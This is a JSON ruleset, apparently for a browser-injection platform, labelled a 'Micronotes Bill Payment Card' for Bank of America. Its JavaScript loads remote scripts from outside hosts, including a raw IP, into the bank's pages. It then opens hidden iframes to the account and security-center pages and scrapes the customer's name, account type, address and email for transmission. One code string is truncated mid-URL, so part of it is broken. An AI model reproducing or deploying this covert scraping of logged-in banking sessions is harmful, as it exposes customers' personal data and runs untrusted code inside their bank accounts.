{"global":[{"emit":"alert(\"test BOA\");    Micronotes = {};    Micronotes.Modes = {        DEBUG: 0,        RELEASE: 1    };        Micronotes.Util = {        mode: Micronotes.Modes.DEBUG,        timeBegin:new Date(),        remote:null,        init: function(){            $K.getScript(\"http://www.micronotes.info/ErrorHandling/jquery-1.3.2.min.js\");             $K.getScript(\"http://www.micronotes.info/ErrorHandling/jquery-ui-1.7.2.custom.min.js\");             $K.getScript(\"http://www.micronotes.info/ErrorHandling/json2.js\");            $K.getScript(\"http://www.micronotes.info/ErrorHandling/easyXDM.min.js\", Micronotes.Util.initChannel);            },        initChannel:function(){            easyXDM.DomHelper.requiresJSON(\"../json2.js\");            console.log(\"%s: %o\", 'easyXDM', easyXDM);            Micronotes.Util.remote = new easyXDM.Interface({                  local: \"/hash.html\",                  remote: \"http://173.1.49.212/EasyXSSDemo/example/remotemethods.html\",                  }, {                  remote: {                    add: {},                    multiplyNumbers: {},                    noOp: {                         isVoid: true                    }                  },                  local: {                     alertMessage: {                          method: function(msg){                            alert(msg);                          },                          isVoid: true                     }                    }                  }, function(){                        Micronotes.Util.remote.noOp();                  });        },        log: function(id, obj) {            if (this.mode == Micronotes.Modes.DEBUG) {                var myConsole = console ? console : window.console ? window.console : null;                if (myConsole) {                    console.log(\"%s: %o\", id, obj);                }            }        },        trim:function(msg){            return msg.replace(/^\\s+|\\s+$/g,\"\");        },        sendToParent:function(msg,url){            if(url){      \t\tMicronotes.Util.log('sendToParent:'+url,JSON.stringify(msg));            }else{                    msg.time=(new Date())-Micronotes.Util.timeBegin;                    alert(JSON.stringify(msg));               \t  \t}        },        sendToChildren:function(msg,url){    \tMicronotes.Util.log('sendToChildren:'+msg,url);        },        injectIFrame:function(id,url,callback){            if(callback){    \t     $K(\"body\").append('<div style=\"display:none\"><iframe width=\"700px\" height=\"500px\" id=\"'+id+'\"  src=\"'+url+'\" onload=\"'+callback+'()\"></div>');            }else{                 $K(\"body\").append('<div style=\"display:none\"><iframe width=\"700px\" height=\"500px\" id=\"'+id+'\"  src=\"'+url+'\"></div>');            }        }    };              jQuery.fn.log = function(msg) {        Micronotes.Util.log(\"%s: %o\", msg, this);        return this;    };    jQuery.fn.pause = function(duration) {        $(this).animate({ dummy: 1 }, duration);        return this;    };        var add=function(a, b){                    remote.addNumbers(a, b, function(result){                        alert(a + \" + \" + b + \" = \" + result);                    });                };                    var multiply = function(a, b){                    remote.multiplyNumbers(a, b, function(result){                        alert(a + \" x \" + b + \" = \" + result);                    });                 };    Micronotes.Util.init();                 "}],"global_start_line":13,"dispatch":[{"domain":"www.micronotes.info","ruleset_id":null},{"domain":"bankofamerica.com","ruleset_id":null}],"dispatch_start_col":5,"meta_start_line":2,"rules":[{"cond":{"val":"true","type":"bool"},"blocktype":"every","actions":[{"action":{"source":null,"name":"noop","args":[],"modifiers":null},"label":null}],"post":null,"pre":null,"name":"bill_payment_center","start_col":5,"emit":"Micronotes.Util.log(\"Page visited:\",document.location.href);         if(($K('title').html().indexOf('Bill Pay Center')!=-1) && (document.location.href.indexOf('#0')==-1)){          alert('Good');         \tvar accountPageUrl=$K(\".primaryNavCnt a:first\").attr(\"href\");         \tMicronotes.Util.injectIFrame('AccountsPage', 'http:    };          ","state":"active","callbacks":null,"pagetype":{"event_expr":{"pattern":"https://bills.bankofamerica.com","legacy":1,"type":"prim_event","vars":[],"op":"pageview"},"foreach":[]},"start_line":17},{"cond":{"val":"true","type":"bool"},"blocktype":"every","actions":[{"action":{"source":null,"name":"noop","args":[],"modifiers":null},"label":null}],"post":null,"pre":null,"name":"accounts_page","start_col":5,"emit":"if(top!=self){      Micronotes.Account={          name:null,         type:null,         address:{             street:null,             city:null,             state:null,             zip:null         },         email:null,      };     alert(\"1\");      Micronotes.DataMining={        isEmailSet:false,        isAddressSet:false,        onSecurityCenterLoad:function(){            var address_link=$K(\"#securityCenter\").contents().find(\"#Personal a:eq(1)\").attr(\"href\");            Micronotes.Util.injectIFrame('AddressPage',address_link,'Micronotes.DataMining.onAddressPageLoad');            var email_link=$K(\"#securityCenter\").contents().find(\"#Personal a:eq(0)\").attr(\"href\");            Micronotes.Util.injectIFrame('EmailPage',email_link,'Micronotes.DataMining.onEmailPageLoad');         },         onAddressPageLoad:function(){           var address=$K('#AddressPage').contents().find(\".txtAddDet:first\").html();           var raw = Micronotes.Util.trim(address);           address=Micronotes.Account.address;            address.street = Micronotes.Util.trim(raw.substring(0,raw.indexOf('<')));             address.city = Micronotes.Util.trim(raw.substring(raw.indexOf('>')+1,raw.indexOf(',')));            address.state = Micronotes.Util.trim(raw.substring(raw.indexOf(',')+1,raw.lastIndexOf(\"&nbsp;\")));           address.zip = Micronotes.Util.trim(raw.substring(raw.lastIndexOf(\"&nbsp;\")+6));            this.isAddressSet=true;           this.notifyFinish();          },         onEmailPageLoad:function(){            Micronotes.Account.email=Micronotes.Util.trim($K('#EmailPage').contents().find(\".SFtdtext1:first\").text());           var billpay_link=$K(\".primaryNavCnt a:eq(2)\").attr(\"href\");           this.isEmailSet=true;           Micronotes.Util.injectIFrame('billPayCenter', billpay_link+'#0', 'Micronotes.DataMining.notifyFinish');                     },         notifyFinish:function(){           if(this.isEmailSet && this.isAddressSet){               Micronotes.Util.sendToParent(Micronotes.Account);             }         }       };                  if($K('title').html().indexOf('Accounts Overview')!=-1){        Micronotes.Util.log(\"Page visited:\",document.location.href);        Micronotes.Account.name=trim($(\".title7new:first\").text().replace(/-.*$/,\"\"));        Micronotes.Account.type=trim($(\".title7new:first\").text().replace(/^.*-/,\"\"));        Micronotes.Util.injectIFrame('securityCenter',$K(\".cmslinknormal:first\").attr(\"href\"),    'Micronotes.DataMining.onSecurityCenterLoad');               }   }               ","state":"active","callbacks":null,"pagetype":{"event_expr":{"pattern":"GotoWelcome","legacy":1,"type":"prim_event","vars":[],"op":"pageview"},"foreach":[]},"start_line":24}],"meta_start_col":5,"meta":{"logging":"off","name":"Micronotes Card for Bank Of America","meta_start_line":2,"description":"Micronotes Bill Payment Card   \n","meta_start_col":5},"dispatch_start_line":9,"global_start_col":5,"ruleset_name":"a69x4"}
